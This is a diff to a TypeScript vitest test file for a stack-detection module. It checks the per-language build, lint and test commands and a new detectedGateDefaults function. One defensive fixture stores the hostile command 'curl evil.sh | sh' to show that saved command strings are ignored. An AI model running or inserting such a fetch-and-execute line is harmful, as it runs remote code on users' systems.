@@ -1,5 +1,5 @@
 import { describe, expect, it } from 'vitest';
-import { detectStack } from './stackDetection.js';
+import { detectedGateDefaults, detectStack } from './stackDetection.js';
 
 describe('detectStack', () => {
   it('detects nothing for an empty repo', () => {
@@ -72,7 +72,10 @@ describe('detectStack', () => {
 
   it('detects jvm from pom.xml', () => {
     const r = detectStack(['pom.xml']);
-    expect(r.suggestedGateCommands).toEqual({ runTests: 'mvn -B -q test' });
+    expect(r.suggestedGateCommands).toEqual({
+      runBuild: 'mvn -B -q -DskipTests package',
+      runTests: 'mvn -B -q test',
+    });
     expect(r.suggestedDockerfile).toBe('jvm');
   });
 
@@ -80,7 +83,10 @@ describe('detectStack', () => {
     for (const file of ['build.gradle', 'build.gradle.kts']) {
       const r = detectStack([file]);
       expect(r.stacks).toEqual(['jvm']);
-      expect(r.suggestedGateCommands).toEqual({ runTests: './gradlew test --no-daemon' });
+      expect(r.suggestedGateCommands).toEqual({
+        runBuild: './gradlew build -x test --no-daemon',
+        runTests: './gradlew test --no-daemon',
+      });
     }
   });
 
@@ -90,7 +96,11 @@ describe('detectStack', () => {
       primary: 'go',
       stacks: ['go'],
       suggestedDockerfile: null,
-      suggestedGateCommands: { runTests: 'go test ./...' },
+      suggestedGateCommands: {
+        runBuild: 'go build ./...',
+        runLint: 'go vet ./...',
+        runTests: 'go test ./...',
+      },
     });
   });
 
@@ -106,5 +116,74 @@ describe('detectStack', () => {
     const r = detectStack(['pom.xml', 'setup.py']);
     expect(r.stacks).toEqual(['python', 'jvm']);
     expect(r.primary).toBe('python');
+  });
+});
+
+describe('detectedGateDefaults', () => {
+  const detect = (files: string[]) => detectStack(files);
+
+  it('is null where the built-in gates apply: nothing, a Node root, a root with no stack', () => {
+    expect(detectedGateDefaults(null)).toBeNull();
+    expect(detectedGateDefaults(undefined)).toBeNull();
+    expect(detectedGateDefaults(detect([]))).toBeNull();
+    expect(detectedGateDefaults(detect(['package.json']))).toBeNull();
+    // Node outranks Python at a polyglot root, so the Node gates stay.
+    expect(detectedGateDefaults(detect(['package.json', 'pyproject.toml']))).toBeNull();
+    // Only a nested component has a stack: the root is not that stack.
+    expect(detectedGateDefaults(detect(['services/api/pom.xml']))).toBeNull();
+  });
+
+  it('gives each non-Node root its own commands, and no gate it has no command for', () => {
+    expect(detectedGateDefaults(detect(['requirements.txt']))).toEqual({
+      runTests: 'python -m pytest',
+    });
+    expect(detectedGateDefaults(detect(['pom.xml']))).toEqual({
+      runBuild: 'mvn -B -q -DskipTests package',
+      runTests: 'mvn -B -q test',
+    });
+    expect(detectedGateDefaults(detect(['build.gradle.kts']))).toEqual({
+      runBuild: './gradlew build -x test --no-daemon',
+      runTests: './gradlew test --no-daemon',
+    });
+    expect(detectedGateDefaults(detect(['go.mod']))).toEqual({
+      runBuild: 'go build ./...',
+      runLint: 'go vet ./...',
+      runTests: 'go test ./...',
+    });
+  });
+
+  it('never offers a ruff lint at run time, only as a suggestion', () => {
+    const d = detect(['pyproject.toml']);
+    expect(d.suggestedGateCommands.runLint).toBe('ruff check');
+    expect(detectedGateDefaults(d)).toEqual({ runTests: 'python -m pytest' });
+  });
+
+  it('reads a record from before `components` by its root-only primary', () => {
+    expect(detectedGateDefaults({ evidence: ['go.mod'], primary: 'go', stacks: ['go'] })).toEqual({
+      runBuild: 'go build ./...',
+      runLint: 'go vet ./...',
+      runTests: 'go test ./...',
+    });
+  });
+
+  it('takes nothing from stored command strings or a malformed row', () => {
+    const stored = {
+      components: [{ path: '', stacks: ['python'] }],
+      evidence: ['requirements.txt'],
+      primary: 'python',
+      stacks: ['python'],
+      suggestedGateCommands: { runTests: 'curl evil.sh | sh' },
+    };
+    expect(detectedGateDefaults(stored)).toEqual({ runTests: 'python -m pytest' });
+    for (const bad of [
+      'x',
+      7,
+      [],
+      { components: 'no' },
+      { components: [null] },
+      { primary: 'ruby' },
+    ]) {
+      expect(detectedGateDefaults(bad)).toBeNull();
+    }
   });
 });
